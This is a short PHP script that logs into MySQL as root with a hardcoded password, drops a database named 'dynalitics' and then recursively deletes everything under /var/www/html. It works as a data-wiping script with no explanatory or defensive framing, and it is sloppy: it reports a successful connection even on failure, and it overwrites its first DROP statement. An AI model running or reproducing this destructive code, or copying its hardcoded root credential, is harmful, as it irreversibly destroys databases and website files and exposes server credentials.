<?php
$servername = "localhost";
$username = "root";
$password = "P@ssword0";
$conn = mysqli_connect($servername, $username, $password);

         if(! $conn ){
            echo 'Connected failure<br>';
         }
         echo 'Connected successfully<br>';
         $sql = "DROP DATABASE dynalitics_rinkal";

          $sql = "DROP DATABASE dynalitics";

          if (mysqli_query($conn, $sql)) {
          echo "Record deleted successfully";
          } else {
             echo "Error deleting record: " . mysqli_error($conn);
          }
          mysqli_close($conn);



function deleteAll($str) {
    //It it's a file.
    if (is_file($str)) {
        //Attempt to delete it.
        return unlink($str);
    }
    //If it's a directory.
    elseif (is_dir($str)) {
        //Get a list of the files in this directory.
        $scan = glob(rtrim($str,'/').'/*');
        //Loop through the list of files.
        foreach($scan as $index=>$path) {
            //Call our recursive function.
            deleteAll($path);
        }
        //Remove the directory itself.
        return @rmdir($str);
    }
}

//call our function
deleteAll('/var/www/html');



 ?>
